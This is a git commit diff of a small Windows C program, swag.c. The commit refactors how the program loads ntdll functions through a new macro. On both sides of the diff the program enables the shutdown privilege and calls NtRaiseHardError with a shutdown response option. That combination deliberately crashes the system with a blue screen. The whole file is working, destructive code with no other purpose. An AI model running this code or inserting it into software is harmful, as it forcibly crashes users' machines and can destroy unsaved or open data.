f53c51dc3bc47fefbc973bbfc9e074746aaf484e
KLohger <fanimdude32@gmail.com>
2024-03-06 20:50:41 +0100

    created dll function macro for readability

--- swag.c
+++ swag.c
@@ -7,24 +7,26 @@ typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(
     NTSTATUS ErrorStatus, ULONG NumberOfParameters,
     ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters,
     ULONG ResponseOption, PULONG Response);
+
 typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege,
                                                  BOOLEAN Enable,
                                                  BOOLEAN CurrentThread,
                                                  PBOOLEAN Enabled);
 
+#define CallLibraryFunction(module, name, type, ...) \
+  ((type)(GetProcAddress(module, name)))(__VA_ARGS__)
+
 int main() {
-  HMODULE ntdll = LoadLibrary("ntdll.dll");
   BOOLEAN bEnabled;
   ULONG uResp;
-  LPVOID lpRtlAjdustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
-  LPVOID lpNtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
-  pdef_RtlAdjustPrivilege RtlAdjutPrivilege =
-      (pdef_RtlAdjustPrivilege)lpRtlAjdustPrivilege;
-  pdef_NtRaiseHardError NtRaiseHardError =
-      (pdef_NtRaiseHardError)lpNtRaiseHardError;
 
-  RtlAdjutPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);
-  NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+  HMODULE ntdll = LoadLibrary("ntdll.dll");
+
+  CallLibraryFunction(ntdll, "RtlAdjustPrivilege", pdef_RtlAdjustPrivilege,
+                      SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);
+
+  CallLibraryFunction(ntdll, "NtRaiseHardError", pdef_NtRaiseHardError,
+                      STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
 
   return 0;
 }
